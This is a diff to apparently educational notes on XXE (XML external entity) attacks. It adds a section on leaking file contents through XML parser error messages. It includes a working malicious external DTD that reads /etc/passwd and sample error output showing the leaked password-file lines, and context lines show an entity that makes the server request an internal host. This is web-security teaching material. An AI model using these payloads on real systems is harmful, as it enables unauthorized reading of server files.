@@ -42,7 +42,7 @@ In the following XXE example, the external entity will cause the server to make 
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 ```
 
-## Exploiting blind XXE exfiltrate data out-of-band
+## Blind XXE exfiltrate data out-of-band
 Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.
 There are two broad ways in which you can find and exploit blind XXE vulnerabilities:
     - You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
@@ -107,3 +107,27 @@ This XXE payload declares an XML parameter entity called xxe and then uses the e
 > This technique might not work with some file contents, including the newline characters contained in the /etc/passwd file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the FTP protocol instead of HTTP. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as /etc/hostname can be targeted instead.
 
 ## Exploiting blind XXE to retrieve data via error messages
+An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response.
+
+You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+This DTD carries out the following steps:
+
+- Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
+- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `error`. The `error` entity will be evaluated by loading a nonexistent file whose name contains the value of the `file` entity.
+- Uses the `eval` entity, which causes the dynamic declaration of the `error` entity to be performed.
+- Uses the `error` entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.
+
+Invoking the malicious external DTD will result in an error message like the following:
+```
+java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+```
